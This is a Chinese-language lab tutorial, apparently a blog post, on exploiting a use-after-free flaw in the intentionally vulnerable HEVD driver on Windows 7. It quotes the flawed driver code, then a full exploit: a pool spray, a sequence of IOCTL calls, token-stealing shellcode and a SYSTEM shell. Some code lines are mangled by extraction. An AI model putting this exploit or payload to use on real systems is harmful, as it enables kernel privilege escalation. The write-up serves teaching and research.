@@ -1,0 +1,509 @@
+## 前言
+
+窥探Ring0漏洞世界：释放后重用漏洞
+
+这也是个很有趣的漏洞类型，对象释放后没有清除对象指针，以至于可能在相同的位置出现假的对象，而让程序认为对象没有被释放是可用的状态，从而执行了假的对象行为。
+
+实验环境：
+
+•虚拟机：Windows 7 x86
+
+•物理机：Windows 10 x64
+
+•软件：IDA，Windbg，VS2022
+
+## 漏洞分析
+
+本例漏洞需要多个函数调用里，直接上源码来看吧。
+
+### AllocateUaFObjectNonPagedPool：
+
+    
+    
+    ///
+    
+    
+    /// Allocate the UaF object in NonPagedPool
+    ///
+    
+    
+    /// NTSTATUS
+    NTSTATUS
+    AllocateUaFObjectNonPagedPool(
+    VOID
+    )
+    {
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = NULL;
+    
+    PAGED_CODE();
+    
+    __try
+    {
+    DbgPrint("[+] Allocating UaF Object\n");
+    
+    //
+    // Allocate Pool chunk
+    //
+    
+    UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)ExAllocatePoolWithTag(
+          NonPagedPool,
+    sizeof(USE_AFTER_FREE_NON_PAGED_POOL),
+    (ULONG)POOL_TAG
+    );
+    
+    if (!UseAfterFree)
+    {
+    //
+    // Unable to allocate Pool chunk
+    //
+    
+    DbgPrint("[-] Unable to allocate Pool chunk\n");
+    
+    Status = STATUS_NO_MEMORY;
+    return Status;
+    }
+    else
+    {
+    DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
+    DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
+    DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(USE_AFTER_FREE_NON_PAGED_POOL));
+    DbgPrint("[+] Pool Chunk: 0x%p\n", UseAfterFree);
+    }
+    
+    //
+    // Fill the buffer with ASCII 'A'
+    //
+    
+    RtlFillMemory((PVOID)UseAfterFree->Buffer, sizeof(UseAfterFree->Buffer), 0x41);
+    
+    //
+    // Null terminate the char buffer
+    //
+    
+    UseAfterFree->Buffer[sizeof(UseAfterFree->Buffer) - 1] = '\0';
+    
+    //
+    // Set the object Callback function
+    //
+    
+    UseAfterFree->Callback = &ampUaFObjectCallbackNonPagedPool
+    
+    //
+    // Assign the address of UseAfterFree to a global variable
+    //
+    
+    g_UseAfterFreeObjectNonPagedPool = UseAfterFree;
+    
+    DbgPrint("[+] UseAfterFree Object: 0x%p\n", UseAfterFree);
+    DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
+    DbgPrint("[+] UseAfterFree->Callback: 0x%p\n", UseAfterFree->Callback);
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+    Status = GetExceptionCode();
+    DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+    
+    return Status;
+    }
+
+申请一个非分页池空间，Buffer里填充A，以0结尾，Callback里填充一个固定的回调函数，使用全局指针变量指向该空间。
+
+使用的结构：
+
+    
+    
+    typedef struct _USE_AFTER_FREE_NON_PAGED_POOL
+    {
+    FunctionPointer Callback;
+    CHAR Buffer[0x54];
+    } USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;
+    
+
+### UseUaFObjectNonPagedPool：
+
+    
+    
+    ///
+    
+    
+    /// Use the UaF object NonPagedPool
+    ///
+    
+    
+    /// NTSTATUS
+    NTSTATUS
+    UseUaFObjectNonPagedPool(
+    VOID
+    )
+    {
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+    
+    PAGED_CODE();
+    
+    __try
+    {
+    if (g_UseAfterFreeObjectNonPagedPool)
+    {
+    DbgPrint("[+] Using UaF Object\n");
+    DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
+    DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool->Callback: 0x%p\n", g_UseAfterFreeObjectNonPagedPool->Callback);
+    DbgPrint("[+] Calling Callback\n");
+    
+    if (g_UseAfterFreeObjectNonPagedPool->Callback)
+    {
+    g_UseAfterFreeObjectNonPagedPool->Callback();
+    }
+    
+    Status = STATUS_SUCCESS;
+    }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+    Status = GetExceptionCode();
+    DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+    
+    return Status;
+    }
+
+判断全局指针，指向的内容是否存在回调，存在就调用。
+
+### FreeUaFObjectNonPagedPool：
+
+    
+    
+    ////// Free the UaF object NonPagedPool
+    ///
+    
+    
+    /// NTSTATUS
+    NTSTATUS
+    FreeUaFObjectNonPagedPool(
+    VOID
+    )
+    {
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+    
+    PAGED_CODE();
+    
+    __try
+    {
+    if (g_UseAfterFreeObjectNonPagedPool)
+    {
+    DbgPrint("[+] Freeing UaF Object\n");
+    DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
+    DbgPrint("[+] Pool Chunk: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
+    
+    #ifdef SECURE
+    //
+    // Secure Note: This is secure because the developer is setting
+    // 'g_UseAfterFreeObjectNonPagedPool' to NULL once the Pool chunk is being freed
+    //
+    
+    ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
+    
+    //
+    // Set to NULL to avoid dangling pointer
+    //
+    
+    g_UseAfterFreeObjectNonPagedPool = NULL;
+    #else
+    //
+        // Vulnerability Note: This is a vanilla Use After Free vulnerability
+    // because the developer is not setting 'g_UseAfterFreeObjectNonPagedPool' to NULL.
+    // Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer
+    // (dangling pointer)
+    //
+    
+    ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
+    #endif
+    
+    Status = STATUS_SUCCESS;
+    }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+     {
+    Status = GetExceptionCode();
+    DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+    
+    return Status;
+    }
+
+释放保存到全局指针的这个空间，这里暴露出UAF漏洞的问题所在：释放完之后指针没有置空，还指向那个释放的空间，如果能在这里构造一个假的结构在这里，就可以执行任意代码了。
+
+### AllocateFakeObjectNonPagedPool：
+
+    
+    
+    ///
+    
+    
+    /// Allocate the Fake object NonPagedPool
+    ///
+    
+    
+    ///The pointer to FAKE_OBJECT_NON_PAGED_POOL structure
+    /// NTSTATUS
+    NTSTATUS
+    AllocateFakeObjectNonPagedPool(
+    _In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject
+    )
+    {
+    NTSTATUS Status = STATUS_SUCCESS;
+    PFAKE_OBJECT_NON_PAGED_POOL KernelFakeObject = NULL;
+    
+    PAGED_CODE();
+    
+    __try
+    {
+    DbgPrint("[+] Creating Fake Object\n");
+    
+    //
+    // Allocate Pool chunk
+    //
+    
+    KernelFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)ExAllocatePoolWithTag(
+    NonPagedPool,
+    sizeof(FAKE_OBJECT_NON_PAGED_POOL),
+    (ULONG)POOL_TAG
+    );
+    
+    if (!KernelFakeObject)
+    {
+    //
+         // Unable to allocate Pool chunk
+    //
+    
+    DbgPrint("[-] Unable to allocate Pool chunk\n");
+    
+    Status = STATUS_NO_MEMORY;
+    return Status;
+    }
+    else
+    {
+    DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
+    DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
+    DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(FAKE_OBJECT_NON_PAGED_POOL));
+    DbgPrint("[+] Pool Chunk: 0x%p\n", KernelFakeObject);
+    }
+    
+    //
+    // Verify if the buffer resides in user mode
+    //
+    
+    ProbeForRead(
+    (PVOID)UserFakeObject,
+    sizeof(FAKE_OBJECT_NON_PAGED_POOL),
+    (ULONG)__alignof(UCHAR)
+    );
+    
+    //
+    // Copy the Fake structure to Pool chunk
+    //
+    
+    RtlCopyMemory(
+    (PVOID)KernelFakeObject,
+    (PVOID)UserFakeObject,
+    sizeof(FAKE_OBJECT_NON_PAGED_POOL)
+    );
+    
+    //
+    // Null terminate the char buffer
+       //
+    
+    KernelFakeObject->Buffer[sizeof(KernelFakeObject->Buffer) - 1] = '\0';
+    
+    DbgPrint("[+] Fake Object: 0x%p\n", KernelFakeObject);
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+    Status = GetExceptionCode();
+    DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+    
+    return Status;
+    }
+
+HEVD为我们提供了申请假对象的调用，申请空间，将假对象从用户层填入。
+
+## 漏洞利用
+
+这四个函数分别由4个控制码进行控制：
+
+#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NXIOCTL(0x814) //
+0x222053  
+#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX IOCTL(0x815) // 0x222057  
+#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX IOCTL(0x816) // 0x22205B  
+#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX IOCTL(0x817) //
+0x22205F
+
+这个漏洞源于释放空间后，指针没有指向NULL，以至于在后续判断指针值的时候，可以伪造假对象出现在相同位置，从而成功通过对该指针的值判断，转而执行shellcode。
+
+这里的一个核心就是，让假的对象出现在真的对象释放后的内存里，可以像之前做池溢出那样，大量申请相同大小的池空间把相同大小的空闲块用光，然后申请真对象释放，此时再申请假对象的时候，大小合适的只有刚刚释放的那个块。
+
+梳理一下要做的事情：
+
+•控制非分页池内存，确保内核对象保存到指定的位置
+
+•申请UAF对象
+
+•释放UAF对象
+
+•申请假UAF对象，假的对象应该出现在真的对象的相同地址
+
+•执行UAF回调，执行shellcode
+
+根据参考资料[1]博文中的介绍，这里可以使用IoCompletionReserve对象来操控内存，因为它有0x60大小来填充我们的非分页池，更接近我们的UAF对象的大小。这些对象可以使用NtAllocateReserveObject函数来喷射。
+
+内存块被释放了以后，会被装入Lookaside List里或者Free
+List里，当内存块变成空闲块被插入的时候，不管插入哪个List，内存块的首4字节都会被覆盖成一个链表指针。
+
+当真正对象被释放之后，指向该地址的指针会指向链表结点，通过申请相同大小的内存让这块内存再次被分配出去，从而使得该地址的首4字节被控制为shellcode。
+
+### 编写exp：
+
+根据讲内核池的那篇论文（参考资料[4]），对于lookaside和ListHeads的释放总是放在适当的List前面，为了更频繁的使用CPU缓存，分配总是从适当的List前面最近使用的块进行分配；所以理论上，只要能保证进行利用的这几次申请（申请1个对象内存然后释放，紧接着申请真对象，释放真对象，申请假对象）中间没有其他相同大小的内存申请释放出现，那么布置内存只需要申请1个内存的申请释放即可完成。
+
+    
+    
+    #include
+    #include
+    
+    // Windows 7 SP1 x86 Offsets
+    #define KTHREAD_OFFSET0x124  // nt!_KPCR.PcrbData.CurrentThread
+    #define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
+    #define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
+    #define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
+    #define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
+    #define SYSTEM_PID         0x004  // SYSTEM Process PID
+    
+    typedef struct _LSA_UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+    } LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;
+    
+    typedef struct _OBJECT_ATTRIBUTES {
+    ULONG           Length;
+    HANDLE          RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG           Attributes;
+    PVOID           SecurityDescriptor;
+    PVOID           SecurityQualityOfService;
+    } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+    
+    typedef NTSTATUS(WINAPI* NtAllocateReserveObject_t)(OUT PHANDLE           hObject,
+    IN POBJECT_ATTRIBUTES ObjectAttributes,
+    IN DWORD              ObjectType);
+    
+    typedef struct _FAKE_OBJECT {
+    CHAR buffer[0x58];
+    } FAKE_OBJECT, * PFAKE_OBJECT;
+    
+    VOID TokenStealingPayloadWin7() {
+    // Importance of Kernel Recovery
+    __asm {
+    pushad
+    
+    ; 获取当前进程EPROCESS
+    xor eax, eax
+    mov eax, fs: [eax + KTHREAD_OFFSET]
+    mov eax, [eax + EPROCESS_OFFSET]
+    mov ecx, eax
+    
+    ; 搜索system进程EPROCESS
+    mov edx, SYSTEM_PID
+    SearchSystemPID :
+    mov eax, [eax + FLINK_OFFSET]
+         sub eax, FLINK_OFFSET
+    cmp[eax + PID_OFFSET], edx
+    jne SearchSystemPID
+    
+    ; token窃取
+    mov edx, [eax + TOKEN_OFFSET]
+    mov[ecx + TOKEN_OFFSET], edx
+    
+    ; 环境还原+ 返回
+    popad
+       mov eax, 1
+    }
+    }
+    
+    int main()
+    {
+    ULONG UserBufferSize = sizeof(FAKE_OBJECT);
+    PVOID EopPayload = &ampTokenStealingPayloadWin7
+    
+    HANDLE hDevice = ::CreateFileW(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
+    
+    PFAKE_OBJECT UserBuffer = (PFAKE_OBJECT)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
+    
+    // 制作假对象
+    RtlFillMemory(UserBuffer, UserBufferSize, 'A');
+    UserBuffer->buffer[UserBufferSize - 1] = '\0';
+    *(PULONG)UserBuffer = (ULONG)EopPayload;
+    
+    
+    NtAllocateReserveObject_t NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtAllocateReserveObject");
+    
+    // 池喷射，消耗其他同等大小的空闲块
+    HANDLE spray_event1[10000] = { 0 };
+    for (size_t i = 0; i < 10000; i++)
+    {
+    NtAllocateReserveObject(&spray_event1[i], FALSE, 1);    // IO_COMPLETION_OBJECT 1
+    }
+    
+    // 布置空洞
+    HANDLE holeObj = NULL;
+    NtAllocateReserveObject(&holeObj, FALSE, 1);
+    CloseHandle(holeObj);
+    
+    
+    // 申请真对象
+    ULONG WriteRet = 0;
+    DeviceIoControl(hDevice, 0x222053, NULL, 0, NULL, 0, &WriteRet, NULL);
+    
+    // 释放真对象
+    DeviceIoControl(hDevice, 0x22205B, NULL, 0, NULL, 0, &WriteRet, NULL);
+    
+    // 申请假对象
+    DeviceIoControl(hDevice, 0x22205F, (LPVOID)UserBuffer, UserBufferSize, NULL, 0, &WriteRet, NULL);
+    
+    // 使用对象
+    DeviceIoControl(hDevice, 0x222057, NULL, 0, NULL, 0, &WriteRet, NULL);
+    
+    HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);
+    UserBuffer = NULL;
+    
+    // 释放申请的对象
+    for (size_t i = 0; i < 10000; i++)
+    {
+    CloseHandle(spray_event1[i]);
+    }
+    
+    system("pause");
+    system("cmd.exe");
+    
+    return 0;
+    }
+
+## 截图演示
+
+![](https://image.3001.net/images/20220729/1659060285_62e3403d543bfc5c5533f.png!small)
+
+## 参考资料
+
+•[1] Windows Kernel Exploitation Tutorial Part 8: Use After Free - rootkit
+(rootkits.xyz) https://rootkits.xyz/blog/2018/04/kernel-use-after-free/
+
+•[2] UAF (Use After Free)漏洞分析及利用_4ct10n的博客-CSDN博客_uaf
+https://blog.csdn.net/qq_31481187/article/details/73612451
+
+•[3] https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf
+
+•[4] kernelpool-exploitation.pdf (packetstormsecurity.net)
+https://dl.packetstormsecurity.net/papers/general/kernelpool-exploitation.pdf
+
